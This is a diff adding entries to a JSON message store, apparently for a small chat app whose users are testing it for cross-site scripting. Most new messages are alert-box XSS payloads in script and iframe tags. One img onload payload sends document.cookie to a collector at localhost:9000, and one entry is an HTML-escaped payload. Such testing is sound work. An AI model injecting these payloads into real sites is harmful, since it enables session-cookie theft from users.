@@ -33,6 +33,42 @@
     {
       "text": "Låtsas vara Ada",
       "author": "ada"
+    },
+    {
+      "text": "<a href=\"https://www.jensenyh.se\">Klicka här<a/>",
+      "author": "chris"
+    },
+    {
+      "text": "<script>alert('XSS')</script>",
+      "author": "chris"
+    },
+    {
+      "text": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+      "author": "chris"
+    },
+    {
+      "text": "<iframe src=\"javascript:alert('Second XSS')\"></iframe>",
+      "author": "ada"
+    },
+    {
+      "text": "<iframe src=\"javascript:alert('Third XSS')\"></iframe>",
+      "author": "ada"
+    },
+    {
+      "text": "<img src=\"https://github.com/favicon.ico\" width=50 height=50 onload=\"this.src='http://localhost:9000/?' + document.cookie\" />",
+      "author": "ada"
+    },
+    {
+      "text": "<iframe src=\"javascript:alert('Tired of XSS')\"></iframe>",
+      "author": "ada"
+    },
+    {
+      "text": "&lt;iframe src=&quot;javascript:alert(&#x27;Second XSS&#x27;)&quot;&gt;&lt;&#x2F;iframe&gt;",
+      "author": "chris"
+    },
+    {
+      "text": "Test igen",
+      "author": "chris"
     }
   ]
 }
